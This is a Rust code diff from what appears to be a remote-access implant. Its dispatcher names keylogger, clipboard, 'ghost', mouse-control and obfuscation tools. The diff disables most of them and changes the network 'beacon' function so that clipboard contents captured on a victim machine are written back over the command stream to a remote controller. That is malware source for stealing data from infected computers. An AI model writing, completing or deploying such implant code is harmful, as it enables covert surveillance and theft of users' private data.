@@ -97,34 +97,35 @@ No tool specified. Use -t or --tool to specify a tool
 Use --list to see a list of available tools")
 }
 
-pub fn run(tool: Tool) -> Result<(), Box<dyn Error>> {
+pub fn run(tool: Tool) -> Result<String, Box<dyn Error>> {
     match tool {
-        Tool::Keylogger => {
-            let _ = keylogger::run();
-        }
+        // Tool::Keylogger => {
+        //     let _ = keylogger::run();
+        // }
         Tool::Clipboard => {
-            let _ = clipboard::run()?;
+            let text = clipboard::run()?;
+            Ok(text)
         }
-        Tool::ReplaceBoard => {
-            let _ = replaceboard::run()?;
-        }
-        Tool::Ghost => {
-            let _ = ghost::run()?;
-        }
-        Tool::Mouseketool => {
-            let _ = mouseketool::run()?;
-        } 
-        Tool::Obufscate => {
-            let filename = get_filename()?;
-            let _ = obfuscate::run(filename)?;
-            return Ok(())
-        }
-        Tool::Invalid => {
+        // Tool::ReplaceBoard => {
+        //     let _ = replaceboard::run()?;
+        // }
+        // Tool::Ghost => {
+        //     let _ = ghost::run()?;
+        // }
+        // Tool::Mouseketool => {
+        //     let _ = mouseketool::run()?;
+        // } 
+        // Tool::Obufscate => {
+        //     let filename = get_filename()?;
+        //     let _ = obfuscate::run(filename)?;
+        //     return Ok(())
+        // }
+        _ => {
             // Return an error if the tool is invalid
             return Err("Invalid tool".into());
         }
+
     }
-    Ok(())
 }
 
 pub fn beacon() {
@@ -135,7 +136,9 @@ pub fn beacon() {
                 if n > 0 {
                     let cmd = String::from_utf8_lossy(&buffer[..n]);
                     let tool = check_tool(&cmd);
-                    run(tool).unwrap();
+                    let result = run(tool).unwrap();
+                    // println!("{}", result);
+                    let _ = stream.write(result.as_bytes()).unwrap();
                 }
             }
         } 
